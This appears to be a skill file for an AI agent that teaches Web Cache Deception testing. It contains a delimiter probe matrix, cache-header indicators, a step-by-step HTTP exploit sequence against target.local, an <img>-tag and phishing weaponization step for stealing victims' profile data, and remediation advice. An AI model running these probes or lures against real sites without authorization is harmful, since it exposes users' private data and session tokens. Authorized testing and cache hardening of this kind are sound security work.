---
name: cache-deception
description: Detect, exploit, and remediate Web Cache Deception (WCD) vulnerabilities arising from URL delimiter confusion, path normalization discrepancies, and static caching rule mismatches between reverse proxies/CDNs and origin web servers.
---

# Web Cache Deception (WCD)

Methodology for discovering and weaponizing Web Cache Deception vulnerabilities where caching intermediaries (Cloudflare, Akamai, Fastly, AWS CloudFront, Nginx reverse proxies) are tricked into caching private, authenticated, or sensitive dynamic HTTP responses and serving them publicly to unauthenticated attackers.

## When to use this skill

Apply this skill when:
- Auditing web architectures that sit behind Content Delivery Networks (CDNs) or reverse proxy caching tiers.
- Testing authenticated endpoints containing Personally Identifiable Information (PII), CSRF tokens, API keys, credit card numbers, or internal user state (e.g. `/profile`, `/api/account/details`, `/settings`, `/dashboard`).
- Path delimiters or file extension suffixes can be appended to dynamic URLs without breaking origin routing.

## Fundamental Architecture & Vulnerability Mechanism

Web Cache Deception occurs when there is a **discrepancy in interpretation** between the Cache Layer (Reverse Proxy / CDN) and the Origin Application Server regarding:
1. **Which resource is being requested**: The CDN sees a static file (e.g. `/profile/test.css`), while the origin executes the dynamic controller for `/profile`.
2. **Whether the response is cacheable**: The CDN caches the response because it ends in `.css` / `.js`, ignoring the dynamic session context, and marks it as public.

```
Attacker / Victim Browser
       │ (1) GET /api/user/profile/avatar.css (with Victim's Cookie)
       ▼
┌─────────────────────────────────┐
│ CDN / Reverse Proxy             │  Rule: "*.css" -> CACHEABLE FOR 24H!
│ (Path: /api/user/profile/avatar.css)
└────────────────┬────────────────┘
                 │ (2) Cache Miss -> Forward to Origin
                 ▼
┌─────────────────────────────────┐
│ Origin Application Server       │  Controller: Ignores trailing "/avatar.css"
│ (Executes: /api/user/profile)   │  Returns: 200 OK + Sensitive User Data JSON
└────────────────┬────────────────┘
                 │ (3) 200 OK Body
                 ▼
┌─────────────────────────────────┐
│ CDN / Reverse Proxy             │  Stores in Public Cache!
└────────────────┬────────────────┘
                 │ (4) Returns to Victim
                 ▼
 Victim Browser (Sees profile)

-- LATER: ATTACKER REQUEST --
Attacker (Unauthenticated)
       │ (5) GET /api/user/profile/avatar.css (No Cookie)
       ▼
┌─────────────────────────────────┐
│ CDN / Reverse Proxy             │  Cache HIT! (Serves cached victim response)
└────────────────┬────────────────┘
                 ▼
 Attacker receives Victim's PII / CSRF Tokens!
```

## Methodology & Delimiter Matrix

### 1. Identify Candidate Dynamic Endpoints
Map all authenticated endpoints that return sensitive dynamic data:
- `/my-account`
- `/api/v1/users/me`
- `/settings/security`
- `/billing/invoices`
- `/user/orders`

### 2. Path Delimiter & Extension Probe Matrix
Test which delimiters are stripped or ignored by the origin application framework:

| Delimiter Syntax | Proxy Interpretation | Origin Framework Handling (e.g. Spring, Django, Rails, Express, PHP) |
| :--- | :--- | :--- |
| **Path Extension (`/`)** | `/account/style.css` -> Caches as CSS | Trailing slash / sub-path routing: Framework serves `/account` or matches wildcard route |
| **Semicolon (`;`)** | `/account;.css` -> Caches as static | Java / Spring Matrix parameter delimiter: treats `;` as parameter start, routes to `/account` |
| **Hash (`#` / `%23`)** | `/account%23.css` -> Caches whole URL | Web server / Python WSGI truncates at `#`, routes to `/account` |
| **Question Mark (`?` / `%3F`)** | `/account%3F.css` -> Caches as static | Reverse proxy does not treat `%3F` as query separator, but origin decodes `%3F` to `?` |
| **Dot Slash (`/.`)** | `/account/..;/account.css` | Normalization discrepancy between Akamai/Cloudflare and Tomcat/Nginx |
| **Null Byte (`%00`)** | `/account%00.css` | Truncation in legacy C/PHP runtimes |
| **Non-Standard Whitespace** | `/account%09.css` | Delimiter confusion in HTTP/1.1 vs HTTP/2 parsing |

### 3. Cache Identification Headers
Inspect response headers to verify if the CDN cached the request:

| Cache Vendor | Miss Header Indicator | Hit Header Indicator (Vulnerable) |
| :--- | :--- | :--- |
| **Cloudflare** | `CF-Cache-Status: MISS` or `DYNAMIC` | `CF-Cache-Status: HIT` |
| **Akamai** | `X-Cache: TCP_MISS` | `X-Cache: TCP_HIT` |
| **AWS CloudFront** | `X-Cache: Miss from cloudfront` | `X-Cache: Hit from cloudfront` |
| **Fastly** | `X-Cache: MISS` | `X-Cache: HIT` |
| **Nginx / Varnish** | `X-Cache-Status: MISS` | `X-Cache-Status: HIT` |

### 4. Step-by-Step Exploit Execution

1. **Step A: Send Authenticated Probe (Simulate Victim)**:
   ```http
   GET /api/user/settings/nonexistent.css HTTP/1.1
   Host: target.local
   Cookie: session_id=AUTHENTICATED_SESSION_COOKIE
   ```
2. **Step B: Verify Origin Execution & Response**:
   Ensure the response returns HTTP `200 OK` with sensitive user data (not 404), and notice `CF-Cache-Status: MISS`.
3. **Step C: Send Unauthenticated Request (Attacker)**:
   ```http
   GET /api/user/settings/nonexistent.css HTTP/1.1
   Host: target.local
   ```
   (No Cookie header provided)
4. **Step D: Confirm Cache Deception**:
   If the unauthenticated request returns HTTP `200 OK` with `CF-Cache-Status: HIT` and contains the authenticated session data from Step A, **Web Cache Deception is confirmed**.

### 5. Weaponization via Social Engineering / Stored Link
To exploit a real victim:
1. Attacker sends the crafted URL (`https://target.local/api/user/settings/nonexistent.css`) to the victim via email, chat, or embedded `<img>` tag:
   `<img src="https://target.local/api/user/settings/nonexistent.css">`
2. The victim's browser visits the URL while logged into `target.local`.
3. The CDN caches the victim's private profile response.
4. The attacker accesses the exact same URL within the cache expiration window (TTL) and exfiltrates the victim's data.

## Remediation & Hardening

1. **Strict Cache-Control Directives**:
   Ensure all authenticated or dynamic endpoints explicitly declare non-cacheable headers:
   ```http
   Cache-Control: no-store, no-cache, must-revalidate, private
   Pragma: no-cache
   ```
2. **CDN Configuration Hardening**:
   - Do NOT cache based solely on file extensions (`.css`, `.js`, `.jpg`) without checking the response `Content-Type` header (e.g. do not cache if `Content-Type` is `application/json` or `text/html`).
   - Disallow caching for requests containing `Cookie` or `Authorization` headers unless explicitly opted-in.
3. **Origin Strict Routing**:
   Disable URL suffix pattern matching. Reject requests with path suffixes (e.g. return strict 404 for `/account/style.css` rather than falling back to `/account`).
4. **Delimiter Normalization**:
   Configure reverse proxies and origin servers to use identical URL decoding and path normalization standards.

## Verification & Deliverables
A complete engagement run of this skill produces:
- Delimiter/extension probe matrix with status-code and cacheable columns.
- MISS→HIT evidence: same pathological path requested twice, second response served from cache (`X-Cache: HIT`) and containing the victim's personalized data.
- Victim-impact proof: URL that, when visited by a logged-in user, leaks their profile/API response into a shared cache entry.
- Social-engineering-ready exploit link and cleanup note (cache purge performed).
- Remediation diff: cache rule normalization, delimiter handling, or Cache-Control hardening plus re-test showing MISS only.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.
